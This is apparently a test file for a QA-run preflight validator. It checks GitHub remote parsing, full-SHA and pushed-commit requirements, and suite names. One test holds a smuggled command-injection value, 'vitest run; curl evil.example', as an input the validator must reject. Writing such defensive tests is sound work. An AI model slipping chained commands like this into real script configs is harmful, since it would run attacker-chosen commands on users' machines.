import { describe, expect, it } from 'bun:test';
import { buildQaRunRequest, parsePublicGithubRemote, QaPreflightError } from '../src/router/qa-preflight.js';

const SHA = 'b'.repeat(40);
const pushedOk = async () => true;
const notPushed = async () => false;

describe('preflight: git remote', () => {
  it('accepts public https and ssh GitHub remotes and normalises them', () => {
    expect(parsePublicGithubRemote('https://github.com/acme/app.git')).toBe('https://github.com/acme/app');
    expect(parsePublicGithubRemote('https://github.com/acme/app')).toBe('https://github.com/acme/app');
    expect(parsePublicGithubRemote('git@github.com:acme/app.git')).toBe('https://github.com/acme/app');
  });

  it('refuses every other host, scheme and path shape', () => {
    for (const bad of ['https://gitlab.com/a/b', 'http://github.com/a/b', 'https://github.com/a/b/c', 'https://user:pass@github.com/a/b', 'file:///tmp/x', 'https://github.com/a/../b']) {
      expect(() => parsePublicGithubRemote(bad)).toThrow(QaPreflightError);
    }
  });
});

describe('preflight: building the request', () => {
  const base = { remoteUrl: 'https://github.com/acme/app.git', sha: SHA, branch: 'main', config: { qa: { scripts: { test: 'test:unit' } } } };

  it('builds a valid request when the commit is pushed', async () => {
    const { body } = await buildQaRunRequest({ ...base, isPushed: pushedOk, suites: ['unit'] });
    expect(body.repo).toBe('https://github.com/acme/app');
    expect(body.sha).toBe(SHA);
    expect(body.scripts.test).toBe('test:unit');
  });

  it('refuses an unpushed commit before anything is submitted', async () => {
    await expect(buildQaRunRequest({ ...base, isPushed: notPushed, suites: ['unit'] })).rejects.toThrow(/not pushed/);
  });

  it('refuses a branch name or short SHA where a full SHA is required', async () => {
    await expect(buildQaRunRequest({ ...base, sha: 'main', isPushed: pushedOk, suites: ['unit'] })).rejects.toThrow(/40/);
    await expect(buildQaRunRequest({ ...base, sha: 'abc1234', isPushed: pushedOk, suites: ['unit'] })).rejects.toThrow(/40/);
  });

  it('refuses script values that are shell strings, not npm script names', async () => {
    const config = { qa: { scripts: { test: 'vitest run; curl evil.example' } } };
    await expect(buildQaRunRequest({ ...base, config, isPushed: pushedOk, suites: ['unit'] })).rejects.toThrow(/script name/);
  });

  it('warns (does not refuse) on a dirty tree, and reports the warning', async () => {
    const r = await buildQaRunRequest({ ...base, isPushed: pushedOk, suites: ['unit'], dirty: true });
    expect(r.warnings).toContain('working tree has uncommitted changes; the run tests the pushed commit only');
  });

  it('refuses an unknown suite', async () => {
    await expect(buildQaRunRequest({ ...base, isPushed: pushedOk, suites: ['unit', 'destroy'] as any })).rejects.toThrow();
  });
});
